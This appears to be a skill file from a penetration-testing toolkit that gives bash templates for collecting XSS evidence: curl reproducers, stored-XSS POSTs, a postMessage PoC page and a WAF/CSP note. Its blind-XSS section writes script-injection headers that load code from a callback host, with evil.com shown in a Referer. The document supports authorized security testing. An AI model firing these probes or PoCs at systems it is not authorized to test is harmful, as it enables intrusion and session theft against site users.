# XSS — Evidence Collection

## Purpose
Capture reproducible proof for every XSS finding. Screenshots with alert/document.domain visible, curl one-liners that reproduce the vuln, request/response pairs, and browser-execution evidence.

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$VULN_PARAM` — injectable parameter
- `$PAYLOAD` — confirmed working payload
- `$EVIDENCE_ROOT` — base evidence directory (`evidence/$TARGET/xss/`)

## Commands

### Standard Evidence Template

```bash
export PATH="/opt/homebrew/bin:$HOME/go/bin:$HOME/Library/Python/3.14/bin:$PATH"

FINDING_ID="xss_${VULN_PARAM}_$(date +%s)"
EVIDENCE_DIR="$EVIDENCE_ROOT/$FINDING_ID"
mkdir -p "$EVIDENCE_DIR"

date -u +%Y-%m-%dT%H:%M:%SZ > "$EVIDENCE_DIR/timestamp.txt"
```

### Manual Curl Proof

```bash
FULL_URL="$TARGET_URL?${VULN_PARAM}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")"

# Full request trace with verbose headers
curl -sv "$FULL_URL" -o "$EVIDENCE_DIR/response_body.txt" 2>"$EVIDENCE_DIR/request_trace.txt"

# Minimal reproducer
cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
# XSS PoC — $FINDING_ID
curl -s '$FULL_URL' | grep -c '$(echo "$PAYLOAD" | grep -oP 'alert\([^)]+\)|onerror=|onload=|src=x')' && echo "[VERIFIED] XSS confirmed" || echo "[-] Payload not reflected"
echo "Open in browser: $FULL_URL"
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

### Browser Screenshot

```bash
echo "$FULL_URL" | httpx -silent -screenshot -ss-path "$EVIDENCE_DIR/" -title -status-code -o "$EVIDENCE_DIR/screenshot_metadata.csv"

# OR: dalfox headless with screenshot-like PoC
dalfox url "$FULL_URL" --silence --headless --timeout 15 -o "$EVIDENCE_DIR/dalfox_confirmation.txt"
```

### Stored XSS Evidence

```bash
# POST trace
curl -sv -X POST "$TARGET_URL/comment" \
  -d "name=${FINDING_ID}&comment=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")" \
  -H "Cookie: SESSION=$SESSION_COOKIE" \
  -o "$EVIDENCE_DIR/stored_post_response.txt" 2>"$EVIDENCE_DIR/stored_request_trace.txt"

# Retrieve rendered page
curl -s "$TARGET_URL/comments" > "$EVIDENCE_DIR/rendered_page.html"
grep -c "$(echo $PAYLOAD | cut -c1-20)" "$EVIDENCE_DIR/rendered_page.html" && \
  echo "Payload persisted on page" >> "$EVIDENCE_DIR/stored_confirmation.txt"
```

### DOM XSS Evidence

```bash
# Source-to-sink trace output
python3 skills/xss/xss_dom_sink_scanner.py --url "$TARGET_URL" --output "$EVIDENCE_DIR/dom_trace.json" 2>/dev/null

# PostMessage PoC HTML
cat > "$EVIDENCE_DIR/postmessage_poc.html" << 'PMHTML'
<html><body>
<h3>postMessage XSS Proof</h3>
<iframe id="t" src="TARGET_URL" width="800" height="600"></iframe>
<script>
document.getElementById('t').onload = () => {
  const payload = 'PAYLOAD';
  setTimeout(() => {
    document.getElementById('t').contentWindow.postMessage(payload, '*');
  }, 2000);
};
</script>
</body></html>
PMHTML
sed -i '' "s|TARGET_URL|$TARGET_URL|g; s|PAYLOAD|$PAYLOAD|g" "$EVIDENCE_DIR/postmessage_poc.html"
```

### Blind XSS Evidence

```bash
echo "$FINDING_ID" > "$EVIDENCE_DIR/blind_probes_sent.txt"
echo "User-Agent: Mozilla\"><script src=${XSSH}></script>" >> "$EVIDENCE_DIR/blind_probes_sent.txt"
echo "X-Forwarded-For: 1.1.1.1\"><img src=${XSSH}>" >> "$EVIDENCE_DIR/blind_probes_sent.txt"
echo "Referer: https://evil.com\"><script src=${XSSH}></script>" >> "$EVIDENCE_DIR/blind_probes_sent.txt"
echo "Check XSSHunter dashboard for callbacks. Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$EVIDENCE_DIR/blind_probes_sent.txt"
```

### WAF/CSP Bypass Evidence

```bash
cat > "$EVIDENCE_DIR/bypass_evidence.md" << BYPEOF
# WAF/CSP Bypass — $FINDING_ID

## WAF Type
$(wafw00f "$TARGET_URL" -a 2>/dev/null | head -10)

## CSP Header
$(curl -sI "$TARGET_URL" | grep -i 'content-security-policy')

## Bypass Payload
$PAYLOAD

## Encoding Used
URL-encoded / double-encoded / case-flip / null-byte / tab-separated
BYPEOF
```

### Evidence Manifest

```bash
{
  echo "# XSS Evidence Manifest — $TARGET_URL"
  echo ""
  echo "| Artifact | Path | Status |"
  echo "|----------|------|--------|"
  for f in request_trace.txt response_body.txt poc.sh screenshot_metadata.csv dalfox_confirmation.txt; do
    [ -f "$EVIDENCE_DIR/$f" ] && echo "| $f | $EVIDENCE_DIR/$f | present |"
  done
} > "$EVIDENCE_DIR/manifest.md"
```

## Detection Signals
- `poc.sh` exists and is executable → reproducible PoC
- `dalfox_confirmation.txt` contains `[VULN]` → tool-confirmed
- `request_trace.txt` shows `< 200 response` → server responded to attack
- Screenshot PNG > 0 bytes → visual proof captured

## Next
├── All evidence collected → bundle for reporting skill
├── If PoC verified → ready for submission
└── Always → validate `ls -lh "$EVIDENCE_DIR"` before declaring complete